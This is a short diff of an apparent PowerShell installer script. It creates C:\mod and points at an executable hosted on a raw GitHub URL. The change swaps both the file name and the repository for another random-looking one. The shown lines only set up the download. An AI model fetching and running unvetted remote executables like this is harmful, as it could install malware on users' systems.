@@ -1,6 +1,6 @@
 $folder = "C:\mod"
-$exe = "$folder\program.exe"
-$url = "https://raw.githubusercontent.com/zesty7272/mods2/refs/heads/main/program.exe"
+$exe = "$folder\progress.exe"
+$url = "https://raw.githubusercontent.com/zzfef33f/sdsdsdsd/refs/heads/main/progress.exe"
 
 
 New-Item -ItemType Directory -Path $folder -Force | Out-Null
